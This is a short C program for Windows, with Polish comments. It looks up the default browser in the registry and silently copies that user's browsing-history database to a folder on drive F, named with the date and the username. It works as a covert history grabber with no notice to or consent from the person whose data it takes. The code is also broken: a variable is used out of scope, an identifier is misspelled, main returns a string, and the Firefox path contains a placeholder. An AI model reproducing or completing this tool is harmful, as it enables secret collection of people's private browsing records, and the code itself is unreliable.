#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <string.h>

char browserPath[1024];

void getDate(char *date, size_t size) {
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	snprintf(date, size, "%d_%02d%02d", tm.tm_year + 1900, tm.tm_mday, tm.tm_mon + 1);
}

void getUser(char *username, DWORD *size) {
	GetUserName(username, size);
}

void getLocation() {
	HKEY hKey;
	DWORD bufferSize = sizeof(browserPath);
	LONG result;

	result = RegOpenKeyEx(HKEY_CLASSES_ROOT, "http\\shell\\open\\command", 0, KEY_READ, &hKey);
	if (result != ERROR_SUCCESS) {
		printf("Błąd otwierania rejestru.\n");
		return;
	}

	result = RegQueryValueEx(hKey, "", NULL, NULL, (LPBYTE)browserPath, &bufferSize);
	if (result == ERROR_SUCCESS) {
        	char *spacePos = strchr(browserPath, ' ');
        	if (spacePos != NULL) {
            		*spacePos = '\0';
		}
	} else {
        	printf("Błąd odczytu rejestru.\n");
	}

	RegCloseKey(hKey);

	if (strstr(browserPath, "chrome.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", username);
    
	} else if (strstr(browserPath, "firefox.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\yourprofile\\places.sqlite", username);
    
	} else if (strstr(browserPath, "msedge.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History", username);
    
	} else if (strstr(browserPath, "opera.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Roaming\\Opera Software\\Opera Stable\\History", username);
    
	} else if (strstr(browserPath, "brave.exe") != NULL) {

        	snprintf(browserPath, sizeof(browserPath), "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History", username);

	} else {

		printf("Nie rozpoznano domyślnej przeglądarki.\n");

	}
}

void copyFile(char *fileLocation, char *fileDestination) {
	if(CopyFile(fileLocation, fileDestination, FALSE))
	{
		exit(0);
	}
	else
	{
		exit(1);
	}
}

int main(int argc, char *argv[]) {
	// Pobranie daty do późniejszego nazwania pliku
	char date[16];
	getDate(date, sizeof(date));

	// Pobranie nazwy użytkownika do późniejszego nazwania pliku
	char username[500];
	DWORD userSize = sizeof(username);
	getUser(username, &userSize);

	// Konstrukcja nazwy pliku
	char fileName[500];
	snprintf(fileName, sizeof(filename), "F://copiedhistory//%s - %s", date, username);

	// Pobranie lokalizacji historii wyszukiwania
	getLocation();

	// Przekopiowanie pliku
	copyFile(browserPath,fileName);
	return "this shouldn't happen...";
}
